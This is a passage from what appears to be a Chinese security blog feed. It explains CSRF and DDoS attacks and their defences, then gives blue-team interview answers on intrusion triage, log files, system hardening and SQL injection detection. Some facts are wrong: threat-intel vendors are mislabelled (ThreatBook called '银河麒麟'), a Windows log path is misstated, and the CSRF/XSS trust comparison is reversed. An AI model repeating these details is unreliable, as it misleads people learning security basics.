Forgery）<br>1.原理：<br>CSRF是一种夹持用户在已经登陆的web应用程序上执行非本意的操作的攻击方式。相比于XSS，CSRF是利用了系统对页面浏览器的信任，XSS则利用了系统对用户的信任。</p><p>由上图分析我们可以知道构成CSRF攻击是有条件的：<br>　　1、客户端必须一个网站并生成cookie凭证存储在浏览器中<br>2、该cookie没有清除，客户端又tab一个页面进行访问别的网站<br>2.危害<br>攻击者利用会话劫持达到自己的目的，比如转账、积分等<br>3.防御<br>（1） GET、POST的正确使用<br>（2） 利用验证码（在一定的情况下使用，但是为了防止客户产生不好印象，尽量不用）<br>（3） Referer Check(HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的，服务器籍此可以获得一些信息用于处理。但服务器并非任何时候都能取到referer、保护客户隐私，不作为预防主要手段)<br>（4） Anti CSRF Token：<br>为每一个表单生成一个随机数秘钥，并在服务器端建立一个拦截器来验证这个token，如果请求中没有token或者token内容不正确，则认为可能是CSRF攻击而拒绝该请求。</p><p>六、 DDos攻击 分布式拒绝服务(Distributed Denial of service Attack)<br>1.原理<br>攻击者想办法让目标服务器的磁盘空间、内存、进程、网络带宽等资源被占满，从而导致正常用户无法访问。<br>攻击者进行拒绝服务攻击，实际上让服务器实现两种效果：一是迫使服务器的缓冲区满，无法接收新的请求;二是使用IP欺骗，迫使服务器把合法用户的连接复位，影响合法用户的连接。<br>攻击者是使用傀儡机(俗称“肉鸡”，受病毒木马操控的计算机或服务器)作为攻击平台，通过大量伪装合法的请求占用大量网络资源，以达到使指定目标的网络或服务瘫痪中断。<br>2.危害：<br>服务器瘫痪、用户无法正常访问。<br>3.类型<br>（1）SYN Flood攻击：这种攻击方法是经典最有效的DDoS方法，主要是通过向受害主机发送大量伪造源 IP 和源端口的 SYN 或 ACK 包，导致主机的缓存资源被耗尽或忙于发送回应包而造成拒绝服务，可通杀各种系统的网络服务。这种攻击由于源头都是伪造的，所以追踪起来比较困难。但是，该攻击实施起来有一定难度，需要大量高带宽的僵尸主机。<br>（2）TCP 全连接攻击：这种攻击是为了绕过常规防火墙的检查而设计的。一般情况下，常规防火墙大多对于正常的 TCP 连接是放过的，但是很多网络服务程序能接受的 TCP 连接数是有限的。TCP全连接攻击就是通过许多僵尸主机不断地与受害服务器建立大量的 TCP 连接，直到服务器的内存等资源被耗尽而被拖跨， 从而造成拒绝服务。种攻击的特点是可绕过一般防火墙的防护而达到攻击;缺点是需要找很多僵尸主机，且僵尸主机的IP 是暴露，易被追踪。<br>（3）刷 Script 脚本攻击：这种攻击是跟服务器建立正常的TCP连接， 并不断的向脚本程序提交查询、 列表等大量耗费数据库资源的调用。一般来说， 提交一个指令对客户端的耗费和带宽的占用是几乎可以忽略的，而服务器为处理此请求却可能要从上万条记录中去查出某个记录，这种处理过程对资源的耗费是非常大。攻击者只需通过代理向目标服务器大量递交查询指令，只需数分钟就会把服务器资源消耗掉而导致拒绝服务。这种攻击的特点是可以完全绕过普通的防火墙防护， 轻松找一些代理就可实施攻击;缺点是对付只有静态页面的网站效果会大打折扣，并且会暴露攻击者的IP地址。<br>4.防御：<br>（1）采用高性能的网络设备<br>（2）尽量避免NAT的使用（NAT需要对地址来回转换，转换过程中需要对网络包的校验和进行计算，因此浪费了很多CPU的时间）<br>（3）充足的网络带宽保证<br>（4）升级主机服务器硬件<br>（5）把网站做成静态页面<br>（6）增强操作系统的TCP/IP栈<br>（7）安装专业抗DDOS防火墙<br>附：IP Spoof: 即IP地址欺骗，是一台主机设备冒充另外一台主机的IP地址，与其它设备通信，从而达到某种目的技术。属于IP Spoof类的攻击还有TCP 半连接攻击，也就是SYN Flood攻击</p>]]></content>
      
      
      <categories>
          
          <category> 护网 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 护网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>蓝初面经</title>
      <link href="/post/16a83dc0.html"/>
      <url>/post/16a83dc0.html</url>
      
        <content type="html"><![CDATA[<h2 id="Windows-入侵排查思路？"><a href="#Windows-入侵排查思路？" class="headerlink" title="Windows 入侵排查思路？"></a>Windows 入侵排查思路？</h2><ol><li>收集信息：收集与系统安全相关的信息，包括日志文件、进程列表、网络连接、系统配置等。</li><li>分析信息：对收集到的信息进行分析，确定异常行为和潜在威胁。</li><li>确认威胁：确认系统存在威胁，并确定其类型和程度。</li><li>阻止攻击：采取相应的措施，尽快阻止攻击并减少损失。</li><li>恢复系统：对受到攻击的系统进行恢复，确保其正常运行。</li></ol><p>具体来说，可以采取以下几种方法进行入侵排查：</p><ol><li>使用防病毒软件：定期使用防病毒软件扫描系统，及时发现并清除潜在的威胁。</li><li>定期更新系统：定期更新系统和安全补丁，以确保系统的安全性。</li><li>监控网络连接：监控网络连接情况，及时发现异常连接和流量，以及非法访问尝试。</li><li>分析日志文件：分析日志文件，了解系统的使用情况和异常行为，及时发现威胁。</li><li>使用安全工具：使用安全工具，如入侵检测系统、网络监控系统等，帮助发现和阻止威胁。</li><li>加强用户教育：加强用户教育，提高用户安全意识，减少人为因素对系统安全的影响。</li></ol><p>总之，入侵排查需要综合运用多种工具和方法，不断加强系统的安全性和监控能力，以保障系统的安全运行。</p><hr><h2 id="Linux-入侵排查思路？"><a href="#Linux-入侵排查思路？" class="headerlink" title="Linux 入侵排查思路？"></a>Linux 入侵排查思路？</h2><ol><li>收集基础信息：收集系统的版本、配置文件和日志等信息，了解系统的正常运行状态。</li><li>分析异常行为：通过比较正常状态与异常状态的差异，分析系统上出现的任何异常行为，例如不寻常的进程、网络流量或文件更改。</li><li>确认入侵点：确定攻击者可能入侵的方式，并检查是否存在未修复的漏洞。</li><li>隔离受感染的系统：及时隔离受感染的系统，以限制损害并避免进一步传播。</li><li>恢复系统：清除恶意代码并修复受损部分，通过备份恢复数据和配置文件，确保系统安全。</li><li>收集证据：收集入侵事件的详细信息，包括攻击的时间、入侵的方式、影响范围、损失情况等，以便后续追踪和定位攻击者。</li></ol><p>在实际操作中，需要结合专业的工具和技能进行排查，例如使用抓包工具Wireshark分析网络流量、使用进程监控工具ps、top、htop等查看进程运行情况。同时，还需要不断学习更新各种安全相关的技能和知识，以提高排查入侵事件的能力。</p><hr><h2 id="Linux-如何查看登录日志？有哪些相关消息文件？"><a href="#Linux-如何查看登录日志？有哪些相关消息文件？" class="headerlink" title="Linux 如何查看登录日志？有哪些相关消息文件？"></a>Linux 如何查看登录日志？有哪些相关消息文件？</h2><p>在 Linux 系统中，可以通过以下方式查看登录日志：</p><ol><li>/var/log/auth.log文件：该文件记录了所有用户的认证信息，包括 SSH 登录、sudo 访问以及 su 切换等操作。</li><li>/var/log/secure文件：该文件用于记录系统身份验证和授权消息，通常在 Red Hat 系统上使用。其中包括 SSH 登录、sudo 访问以及 su 切换等操作。</li><li>/var/log/messages文件：该文件记录了系统的运行消息，包括启动和关闭服务、内核消息以及其他重要事件。</li><li>w命令：可以查看当前已登录的用户和他们的会话信息。</li><li>last命令：可以查看最近所有登录和注销会话的用户列表以及日期和时间。</li><li>lastlog命令：可以查看所有用户最后一次登录的时间和位置。</li></ol><p>需要注意的是，在某些系统中这些文件名可能会有所不同，例如 Ubuntu 系统中的 /var/log/auth.log 文件可能是 /var/log/auth.log.1、/var/log/auth.log.2.gz等形式。因此，在查看登录日志时，最好先了解当前系统的具体情况。</p><hr><h2 id="Windows-和-Linux-的日志文件放在哪里？"><a href="#Windows-和-Linux-的日志文件放在哪里？" class="headerlink" title="Windows 和 Linux 的日志文件放在哪里？"></a>Windows 和 Linux 的日志文件放在哪里？</h2><p>Windows:</p><ol><li>系统事件记录器：Event Viewer 应用程序中提供了 Windows 系统的事件日志管理工具。这些日志文件通常存储在 C:\Windows\System32\winevt\Logs 目录中。</li><li>应用程序日志：包括应用程序特定的事件、错误和警告等信息，可以使用 Event Viewer 应用程序进行查看。这些日志文件通常存储在应用程序的安装目录下或者 Windows 系统目录中。</li><li>安全日志：记录有关系统安全性的重要信息，例如登录、注销、权限更改等。这些日志文件通常存储在 C:\Windows\System32\winevt\Security.evtx 文件中。</li></ol><p>Linux:</p><ol><li>系统日志：Linux 系统中的所有日志都存储在 /var/log 目录下。主要的日志文件包括：</li></ol><ul><li>/var/log/messages：记录系统启动期间的消息以及其他系统级别的消息。</li><li>/var/log/syslog：记录核心系统日志，也包括其他应用程序的日志。</li><li>/var/log/auth.log：记录用户登录和其他身份验证相关事件的日志文件。</li></ul><ol><li>各种服务/软件的日志文件：各种服务或软件分别根据自己的命名规范来命名相应的日志文件，其中一些可能位于 /var/log 目录下，而另一些则可能位于 /var/log/service 目录下。</li></ol><p>需要注意的是，日志文件在系统运行一段时间后可能会变得非常庞大，因此需要定期进行归档和清理，以释放磁盘空间并提高系统性能。</p><hr><h2 id="Linux-常用排查命令有哪些？"><a href="#Linux-常用排查命令有哪些？" class="headerlink" title="Linux 常用排查命令有哪些？"></a>Linux 常用排查命令有哪些？</h2><p>在 Linux 系统中，有许多工具和命令可以用来排查问题。以下是一些常用的排查命令：</p><ol><li>top：显示当前系统中最占用 CPU 和内存的进程。</li><li>ps：显示当前系统所有运行的进程列表。</li><li>netstat：显示网络连接状态和统计信息，例如打开的端口、TCP/UDP 连接和网络接口等。</li><li>ifconfig/iwconfig：显示网络接口的状态和配置信息。</li><li>ping/traceroute：用于测试网络是否连通以及检测网络故障的工具。</li><li>df/du：显示磁盘使用情况，包括已用空间和可用空间等信息。</li><li>ls/lsof：用于查看打开的文件、目录和文件描述符。</li><li>strace/ltrace：跟踪应用程序执行期间的系统调用和库函数调用。</li><li>tcpdump：捕获网络数据包并将其记录到日志文件中，以便进行后续分析。</li><li>tail：实时监视日志文件，并显示最新添加的日志信息。</li></ol><p>以上这些命令只是其中的一部分，不同的问题可能需要使用不同的命令和工具。在实际操作中，需要根据具体的情况选择合适的命令和工具，并结合自己的经验和知识进行排查。</p><hr><h2 id="Linux-的-Selinux-是什么？如何设置-Selinux？"><a href="#Linux-的-Selinux-是什么？如何设置-Selinux？" class="headerlink" title="Linux 的 Selinux 是什么？如何设置 Selinux？"></a>Linux 的 Selinux 是什么？如何设置 Selinux？</h2><p>SELinux（Security-Enhanced Linux）是一个针对 Linux 内核的安全模块，它可以限制进程和用户的访问权限，并提供更加细粒度的访问控制。SELinux 基于强制访问控制（MAC）模型，将每个进程/对象分配到不同的安全上下文中，并通过策略文件来定义这些上下文之间的关系。</p><p>在 Linux 中，SELinux 可以通过以下步骤进行设置：</p><ol><li>检查 SELinux 状态：使用命令 getenforce 或者 sestatus 来检查当前 SELinux 的状态，例如 enforcing、permissive 或者 disabled 等。</li><li>修改 SELinux 配置文件 /etc/selinux/config：可以修改 SELINUX 参数的值为 enforcing（强制模式）、permissive（宽容模式）或者disabled（禁用 SELinux）等。</li><li>安装和管理 SELinux 策略包：使用 yum 命令安装和管理 SELinux 相关的策略包，例如 policycoreutils 和 selinux-policy 等。</li><li>设定 SELinux 上下文：使用 chcon、semanage 和 restorecon 等命令来更改文件或目录的安全上下文。</li><li>确认 SELinux 日志：在排除 SELinux 相关问题时可以使用命令 ausearch、ausearch、auditctl 等来确认 SELinux 日志。</li></ol><p>需要注意的是，在对 SELinux 进行设置和管理时，需要有一定的 Linux 系统管理经验和 SELinux 相关知识。因为错误的配置可能会导致系统不稳定或者无法启动，所以在操作前应仔细阅读相关文档并进行备份。</p><hr><h2 id="Linux、Windows-安全加固"><a href="#Linux、Windows-安全加固" class="headerlink" title="Linux、Windows 安全加固"></a>Linux、Windows 安全加固</h2><p>Linux 安全加固：</p><ol><li>更新所安装的软件包：定期更新系统中所有软件包以修复已知漏洞。</li><li>禁用不必要的服务：禁用不必要的网络服务，减少攻击面。</li><li>配置防火墙：使用防火墙限制入站和出站网络流量，只允许合法的流量通过。</li><li>加强密码策略：设置强密码策略并启用多因素身份验证。</li><li>禁用 root 登录：禁止使用 root 用户登录系统，并将 sudo 和 su 访问权限限制到必要的人员或组。</li><li>使用 SELinux 或 AppArmor：使用 SELinux 或 AppArmor 来实现更细粒度的应用程序和文件访问控制。</li><li>配置 SSH 访问：使用 SSH 协议连接服务器时配置限制 IP 地址和端口号等安全措施。</li><li>定期备份数据：定期备份重要数据至外部存储设备，以防止数据丢失和系统损坏。</li></ol><p>Windows 安全加固：</p><ol><li>更新操作系统和软件：及时安装 Windows 操作系统和软件的安全更新。</li><li>禁用 SMBv1：由于 SMBv1 协议存在一些严重的漏洞，建议禁用 SMBv1 协议。</li><li>启用 UAC：启用用户账户控制（UAC），以限制非管理员用户的系统访问权限。</li><li>配置防火墙：使用 Windows 防火墙过滤不必要的网络流量，并确保只允许合法的流量通过。</li><li>使用 BitLocker 或类似的加密工具：对重要数据和文件进行加密存储，以避免数据泄漏。</li><li>配置组策略：使用本地组策略或 Active Directory 组策略来限制用户和计算机的访问权限。</li><li>检查安全事件日志：定期检查 Windows 安全事件日志，了解系统中发生的任何异常事件。</li><li>定期备份数据：定期备份重要数据至外部存储设备，以防止数据丢失和系统损坏。</li></ol><p>需要注意的是，这些措施只是增强系统安全的一部分，而不能保证系统绝对安全。因此，建议采取多种方法来保护自己的系统和数据。</p><hr><h2 id="windows-日志分析工具"><a href="#windows-日志分析工具" class="headerlink" title="windows 日志分析工具"></a>windows 日志分析工具</h2><ol><li>Event Viewer：Windows 自带的日志管理工具，可以查看和分析 Windows 系统中的各种事件日志。</li><li>Log Parser：一款免费的命令行工具，可以查询和分析日志文件、IIS 日志、Windows 注册表、Active Directory 等数据源。</li><li>Microsoft Message Analyzer：一款强大的网络协议分析工具，可以捕获和分析 Windows 操作系统上的网络流量和事件日志。</li><li>Syslog-ng：一个高性能的日志管理工具，可以帮助用户收集和分析来自不同平台的日志信息。</li><li>Graylog：一款开源的日志管理工具，可以帮助用户收集、存储和分析来自不同来源的日志信息，并提供直观易用的用户界面。</li><li>Splunk：一款商业化的日志管理工具，可以帮助用户实时监控、搜索、分析和可视化来自不同来源的日志信息。</li></ol><p>需要注意的是，在选择日志分析工具时，需要根据自己的需求和实际情况进行选择，并结合相关操作系统和网络知识进行使用。</p><hr><h2 id="Linux-日志分析技巧命令"><a href="#Linux-日志分析技巧命令" class="headerlink" title="Linux 日志分析技巧命令"></a>Linux 日志分析技巧命令</h2><ol><li><p>grep 命令：用于在文本文件中搜索指定的字符串和模式，例如可以使用 grep error /var/log/messages 命令来查找系统日志中的错误信息。</p></li><li><p>tail 命令：实时监视日志文件，并显示最新添加的日志信息，例如可以使用 tail -f /var/log/messages 命令来实时监视系统消息。</p></li><li><p>sed 和 awk 命令：可以用来编辑和处理文本文件，例如可以使用 awk ‘/error/ {print $0}’ /var/log/messages 命令来筛选出包含 error 字符串的日志信息。</p></li><li><p>journalctl 命令：用于查询和查看 systemd 系统日志，例如可以使用 journalctl -u nginx.service 命令来查看 Nginx 服务的日志信息。</p></li><li><p>dmesg 命令：用于打印内核环境变量缓冲区的内容包</p><h2 id="Linux-基线规范"><a href="#Linux-基线规范" class="headerlink" title="Linux 基线规范"></a>Linux 基线规范</h2></li></ol><p>Linux 基线规范是指为了保证 Linux 系统安全性和可靠性，制定的一系列最佳实践和标准化要求。Linux 基线规范通常包括以下几个方面：</p><ol><li>安全加固：禁用不必要的服务、配置防火墙、强化密码策略等。</li><li>用户和权限管理：创建普通用户账号、限制 root 账号访问、使用 sudo 进行授权等。</li><li>日志管理：启用系统日志、日志文件备份和归档、监控日志信息等。</li><li>文件系统和目录结构规范：对重要数据进行加密、使用 ext4 文件系统、分区管理等。</li><li>网络安全：检查网络连接状态、限制入站和出站流量、使用 SELinux 或 AppArmor 等。</li><li>软件更新与安全漏洞修复：定期更新操作系统和软件补丁、及时处理已知漏洞等。</li><li>数据备份与恢复：定期备份和恢复系统数据和设置等。</li></ol><p>需要注意的是，不同的公司或组织可能会有不同的基线规范要求。在实践中，我们可以根据自己的需求和安全风险评估情况，设计并实施相应的基线规范，并定期进行评估和调整。这样可以帮助我们规范化 Linux 系统的管理和维护，并提高系统的可靠性和安全性。</p><hr><h2 id="Windows-安全基线检查"><a href="#Windows-安全基线检查" class="headerlink" title="Windows 安全基线检查"></a>Windows 安全基线检查</h2><p>Windows 安全基线检查是指通过对 Windows 操作系统进行安全配置和最佳实践检查，来评估系统的安全性和完整性。Windows 安全基线包括以下几个方面：</p><ol><li>用户和权限管理：创建普通用户账号、限制管理员账号访问、使用 UAC 进行授权等。</li><li>密码策略：设置强密码策略，并启用多因素身份验证。</li><li>网络安全：配置防火墙、禁用不必要的服务、加密敏感数据传输等。</li><li>软件更新与安全漏洞修复：定期更新操作系统和软件补丁、及时处理已知漏洞等。</li><li>日志管理：启用系统日志、监控日志信息、建立日志归档等。</li><li>文件和目录权限：配置文件系统和目录结构规范、限制文件和目录访问权限等。</li><li>数据备份与恢复：定期备份和恢复系统数据和设置等。</li></ol><p>为了进行 Windows 安全基线检查，可以使用 Microsoft Security Compliance Toolkit 工具，该工具包含安全基线和最佳实践检查工具，并提供安全配置模板和分析报告。此外，还可以使用第三方商业化工具，例如 SolarWinds、McAfee 等，来帮助进行 Windows 安全基线检查。</p><p>需要注意的是，安全基线检查只是评估系统安全性的一部分。为了保证 Windows 系统的安全性和可靠性，还需要采取其他措施，例如定期更新操作系统和软件补丁、加强密码策略、备份数据等。</p><hr><h2 id="中间件基线规范（APACHE）"><a href="#中间件基线规范（APACHE）" class="headerlink" title="中间件基线规范（APACHE）"></a>中间件基线规范（APACHE）</h2><p>Apache 是一款常用的 Web 服务器软件，为了保障其安全可靠地运行，可以制定中间件基线规范。以下是 Apache 中间件基线规范的一些重要措施：</p><ol><li>版本号管理：定期检查并更新 Apache 版本，及时安装最新版本的补丁与安全更新。</li><li>配置文件规范：对 Apache 的配置文件进行规范化和审计，限制网站访问权限、禁止目录浏览等。</li><li>日志管理：启用 Apache 访问日志和错误日志，定期清理日志文件并做好备份、归档等工作。</li><li>安全加固：如禁用不必要的模块、关闭 TRACE 请求响应、限制 HTTP 方法等。</li><li>SSL/TLS 加强：设置 TLS 选项、开启 HSTS、使用证书身份验证等。</li><li>防火墙和反向代理策略：通过防火墙等技术来过滤恶意流量，使用反向代理策略限制直接连接到 Web 服务器的 IP 地址。</li><li>应用安全：对 Web 应用程序进行安全审计，确保程序的漏洞被修复、未受到攻击等。</li></ol><p>需要注意的是，以上这些措施只是 Apache 中间件基线规范的一部分，实际操作中还需要根据具体情况进行评估和调整。同时，要保障 Apache 服务器的安全性和可靠性，还需要定期备份数据、优化性能等工作。</p><hr><h2 id="中间件常见漏洞"><a href="#中间件常见漏洞" class="headerlink" title="中间件常见漏洞"></a>中间件常见漏洞</h2><p>中间件是指应用程序和操作系统之间的软件组件，常见的中间件漏洞有以下几种：</p><ol><li>Web服务器漏洞：针对Web服务器（如Apache、Nginx）的攻击通常包括利用目录遍历、文件包含、SQL注入等技术。</li><li>数据库漏洞：数据库（如MySQL、Oracle、SQL Server）的漏洞通常涉及未授权的访问、SQL注入等方面。</li><li>应用服务器漏洞：应用服务器（如Tomcat、JBoss、WebLogic）的漏洞通常会导致远程执行代码、拒绝服务等问题。</li><li>消息队列漏洞：消息队列（如RabbitMQ、Kafka）的漏洞通常涉及未授权访问、拒绝服务等问题。</li><li>缓存服务器漏洞：缓存服务器（如Redis、Memcached）的漏洞通常包括未授权访问、命令注入等问题。</li><li>中间件配置问题：中间件的错误配置也可能导致安全问题，比如弱密码、不安全的协议配置等。</li></ol><p>需要注意的是，中间件漏洞是日益增多的，因此建议及时更新和修补中间件的安全漏洞。</p><hr><h2 id="常见中间件的配置文件路径知道哪些？"><a href="#常见中间件的配置文件路径知道哪些？" class="headerlink" title="常见中间件的配置文件路径知道哪些？"></a>常见中间件的配置文件路径知道哪些？</h2><p>不同的中间件软件有不同的配置文件路径。以下是几种常见中间件软件的配置文件路径：</p><ol><li>Apache Web 服务器：httpd.conf 文件通常位于 /etc/httpd/ 或者 /usr/local/apache2/conf/ 目录下。</li><li>Nginx Web 服务器：nginx.conf 文件通常位于 /etc/nginx/ 或者 /usr/local/nginx/conf/ 目录下。</li><li>MySQL 数据库：my.cnf 文件通常位于 /etc/mysql/ 或者 /usr/local/mysql/etc/ 目录下。</li><li>PostgreSQL 数据库：postgresql.conf 和 pg_hba.conf 文件通常位于 /var/lib/pgsql/data/ 或者 /etc/postgresql//main/ 目录下。</li><li>Oracle 数据库：initSID.ora 和 listener.ora 文件通常位于 $ORACLE_HOME/dbs/ 目录下。</li><li>Tomcat 应用服务器：server.xml、context.xml 和 web.xml 文件通常位于 /conf/ 目录下。</li><li>JBoss 应用服务器：standalone.xml 和 standalone-full.xml 文件通常位于 /standalone/configuration/ 目录下。</li></ol><p>需要注意的是，这些路径可能会根据不同的操作系统而有所不同，并且也会随着中间件版本的更新而变化。因此，在进行中间件配置时，建议查询官方文档或参考相关文献以获取最新的配置文件路径信息。</p><hr><h2 id="常用的安全工具以及常见的设备有哪些？"><a href="#常用的安全工具以及常见的设备有哪些？" class="headerlink" title="常用的安全工具以及常见的设备有哪些？"></a>常用的安全工具以及常见的设备有哪些？</h2><p>常用的安全工具和设备有很多，以下是其中一些常见的：</p><ol><li>防火墙（Firewall）：防火墙可以过滤网络流量，保护网络不受外部攻击。常见的防火墙包括硬件防火墙和软件防火墙。</li><li>入侵检测系统（Intrusion Detection System, IDS）：IDS 可以监控网络流量、检测恶意行为和入侵事件，并向管理员发出警报。</li><li>入侵防御系统（Intrusion Prevention System, IPS）：IPS 可以在 IDS 的基础上主动预防入侵事件，并进行自动化响应。</li><li>统一威胁管理平台（Unified Threat Management, UTM）：UTM 是一种集成了防火墙、IDS/IPS、VPN、反病毒等多种功能的综合性安全解决方案。</li><li>脆弱性扫描器（Vulnerability Scanner）：脆弱性扫描器可以发现系统中可能存在的漏洞，并提供修补建议。</li><li>安全信息和事件管理系统（Security Information and Event Management, SIEM）：SIEM 可以对安全事件和日志数据进行收集、分析和报告，帮助管理员更好地了解和响应安全事件。</li><li>代理服务器（Proxy Server）：代理服务器可以过滤流量、检查内容和访问控制，提供额外的安全保护。</li><li>负载均衡器（Load Balancer）：负载均衡器可以平衡网络流量，分担服务器负载，提高网络性能和可用性。</li><li>加密设备：加密设备可以对数据进行加密处理，防止数据被窃取或篡改。</li></ol><p>需要注意的是，以上只是其中一些常见的安全工具和设备，实际应用中还有很多其他的安全工具和设备。在选择和使用安全工具和设备时，需要根据具体情况进行评估和选择，并确保其符合实际需求和安全标准。</p><hr><h2 id="你知道的威胁情报库有哪些？"><a href="#你知道的威胁情报库有哪些？" class="headerlink" title="你知道的威胁情报库有哪些？"></a>你知道的威胁情报库有哪些？</h2><ol><li>银河麒麟（ThreatBook）：银河麒麟是国内领先的网络安全威胁情报服务提供商，其威胁情报库包括恶意软件、攻击源IP、域名等方面的信息。</li><li>国家互联网应急中心（CNCERT）：CNCERT 是中国政府统一组织和协调全国互联网安全工作的部门，其威胁情报库包括漏洞、恶意代码、攻击事件等方面的信息。</li><li>安恒威胁情报中心（ATIS）： ATIS 是安恒信息安全研究院旗下的威胁情报中心，其威胁情报库涵盖了APT攻击、Web攻击、恶意邮件、移动恶意软件等方面的信息。</li><li>漏洞盒子（KnownSec）：漏洞盒子是一家致力于网络安全防御和攻防技术研究的公司，其威胁情报库包括漏洞、恶意代码等方面的信息。</li><li>360威胁情报中心（360 TI Center）：360 威胁情报中心聚焦于威胁情报、安全事件响应和恶意代码研究等领域，其威胁情报库包括APT攻击、恶意URL等方面的信息。</li></ol><p>需要注意的是，以上威胁情报库只是其中一部分，实际应用中还有很多其他的威胁情报库。在使用威胁情报库时，需要根据具体需求进行评估和选择，并确保数据来源可靠、及时和准确。</p><hr><h2 id="怎么发现有没有被攻击？"><a href="#怎么发现有没有被攻击？" class="headerlink" title="怎么发现有没有被攻击？"></a>怎么发现有没有被攻击？</h2><p>发现自己是否被攻击是网络安全管理中非常重要的一环。以下是几种常见的发现被攻击的方法：</p><ol><li>安全日志监控：对系统和应用程序的安全日志进行监控，可以及时发现异常活动和安全事件。例如，登录失败、异常访问、恶意软件入侵等。</li><li>网络流量分析：通过对网络流量进行监控和分析，可以发现可能存在的攻击行为。例如，大量来自某个 IP 地址或特定端口的流量、恶意脚本和代码注入等。</li><li>主机基线监测：通过对应用程序、操作系统和数据文件等资源进行基线监测，可以及时发现可能存在的异常变化和不正常的活动。</li><li>脆弱性扫描：通过使用脆弱性扫描工具，可以发现系统中可能存在的漏洞，并提供修补建议。</li><li>威胁情报监测：通过使用威胁情报库和服务，可以了解到当前存在的威胁活动，及时采取防御措施。</li><li>安全演练：通过进行安全演练，可以模拟真实的攻击场景，评估自身的安全状态，及时发现和修复存在的问题。</li></ol><p>需要注意的是，以上方法只是其中一部分，实际应用中还有很多其他的发现被攻击的方法。在进行网络安全管理时，需要综合使用多种方法，并不断更新和完善自身的防御措施，以提高安全水平和减少被攻击的风险。</p><hr><h2 id="SQL-注入如何进行检测"><a href="#SQL-注入如何进行检测" class="headerlink" title="SQL 注入如何进行检测"></a>SQL 注入如何进行检测</h2><ol><li>数据库异常日志：在数据库服务器上查看异常日志或错误日志，如果发现异常 SQL 语句，或者 SQL 语句中包含可疑代码或关键字，就可能存在 SQL 注入攻击。</li><li>应用服务器日志：在应用服务器上查看访问日志或错误日志，如果发现访问异常、错误码增多，或者包含可疑的 URL 参数等信息，也可能表明存在 SQL 注入攻击。</li><li>漏洞扫描工具：使用专业的漏洞扫描工具，可以自动化地检测应用程序中可能存在的 SQL 注入漏洞，并提供修补建议。</li><li>安全审计：通过记录用户行为和操作日志，可以检测和追踪可能存在的 SQL 注入攻击。</li><li>手动测试：模拟攻击者的行为，手动输入特定的 SQL 语句或注入代码，来验证是否存在 SQL 注入漏洞。</li></ol><p>需要注意的是，以上方法只是其中一部分，实际应用中还有很多其他的 SQL 注入检测方法。在进行 SQL 注入检测时，需要综合使用多种方法，并不断更新和完善自身的防御措施，以提高安全水平和减少被攻击的风险。同时，如果确实发现了 SQL 注入攻击，应及时采取措施来修复漏洞并保护数据库中的数据。</p><hr><h2 id="Sql-注入加固措施？"><a href="#Sql-注入加固措施？" class="headerlink" title="Sql 注入加固措施？"></a>Sql 注入加固措施？</h2><p>为了防止 SQL 注入攻击，可以采取以下一些常见的加固措施：</p><ol><li>输入验证：对用户输入数据进行验证和过滤，特别是对单引号、双引号、分号等特殊字符进行处理。可以使用输入过滤函数或正则表达式等方式来实现。</li><li>参数化查询：使用参数化查询操作数据库，可以将用户输入的数据视为参数而不是 SQL 代码的一部分，从而避免 SQL 注入攻击。</li><li>最小化权限原则：在应用程序连接数据库时，给予最小必要的权限，并严格控制数据库访问权限，以减少攻击者利用 SQL 注入漏洞获取敏感信息的可能性。</li><li>安全编码标准：在开发应用程序时，遵循安全编码标准，避免使用拼接 SQL 语句的方式，而是采用参数化查询等安全方式来操作数据库。</li><li>异常信息处理：在应用程序中添加异常处理机制，可以及时捕获和记录 SQL 注入攻击产生的异常信息，便于管理员及时发现和修复问题。</li><li>安全审计：通过记录用户行为和操作日志，可以检测和追踪可能存在的 SQL 注入攻击。</li></ol><p>需要注意的是，以上只是其中一部分常见的 SQL 注入加固措施，针对不同的应用和场景，可能需要采用不同的加固措施。在进行 SQL 注入防御时，需要综合考虑多种因素，并不断更新和完善自身的防御措施，以提高安全水平并减少被攻击的风险。</p><hr><h2 id="文件上传和命令执行，有看过相关日志吗？"><a href="#文件上传和命令执行，有看过相关日志吗？" class="headerlink" title="文件上传和命令执行，有看过相关日志吗？"></a>文件上传和命令执行，有看过相关日志吗？</h2><p>文件上传和命令执行都是常见的 Web 应用程序安全漏洞，攻击者利用漏洞上传恶意文件或执行恶意代码，从而获取服务器上的敏感数据或控制服务器。在进行安全管理时，通常可以通过查看相关日志来发现潜在的安全威胁。</p><p>对于文件上传漏洞，以下是一些可能存在的相关日志：</p><ol><li>文件上传日志：Web 服务器或应用服务器上的访问日志中可能包含上传文件的信息，例如上传时间、上传文件名称、上传文件大小等。</li><li>访问控制日志：如果应用程序实现了文件上传的访问控制机制，记录访问控制的日志可能包含了上传文件的信息，例如上传人员、上传时间、上传 IP 地址等。</li><li>安全审计日志：如果使用了安全审计工具，可以记录文件上传操作的详细信息，例如上传文件的路径、上传文件的内容等。</li></ol><p>对于命令执行漏洞，以下是一些可能存在的相关日志：</p><ol><li>访问日志：Web 服务器或应用服务器上的访问日志中可能包含恶意代码执行的信息，例如请求 URL、HTTP 请求方法、HTTP 状态码等。</li><li>异常日志：应用程序中的异常日志可以记录可能存在的恶意代码执行异常信息，例如异常类型、异常堆栈等。</li><li>安全审计日志：如果使用了安全审计工具，可以记录恶意代码执行的详细信息，例如恶意代码的来源、执行时间、执行结果等。</li></ol><p>需要注意的是，以上只是其中一部分可能存在的相关日志，实际应用中还有更多可能的日志类型。在进行文件上传和命令执行漏洞的检测和防御时，需要根据具体应用进行评估和选择，并及时发现和修复潜在的安全威胁。</p><hr><h2 id="你能说明文件上传的原理吗？"><a href="#你能说明文件上传的原理吗？" class="headerlink" title="你能说明文件上传的原理吗？"></a>你能说明文件上传的原理吗？</h2><p>当用户上传文件时，通常需要通过 HTTP 或 HTTPS 协议将文件传输到 Web 服务器。文件上传的原理可以简单地描述为：</p><ol><li>客户端向服务器发送一个包含文件数据的 POST 请求。</li><li>服务器接收请求并解析其中的文件数据。</li><li>服务器将文件保存在指定的目录下，并返回处理结果给客户端。</li></ol><p>具体来说，文件上传流程一般如下：</p><ol><li>用户在 Web 页面上选择要上传的文件，并提交表单。</li><li>浏览器将表单中的数据进行编码并作为 POST 请求发送给 Web 服务器。</li><li>Web 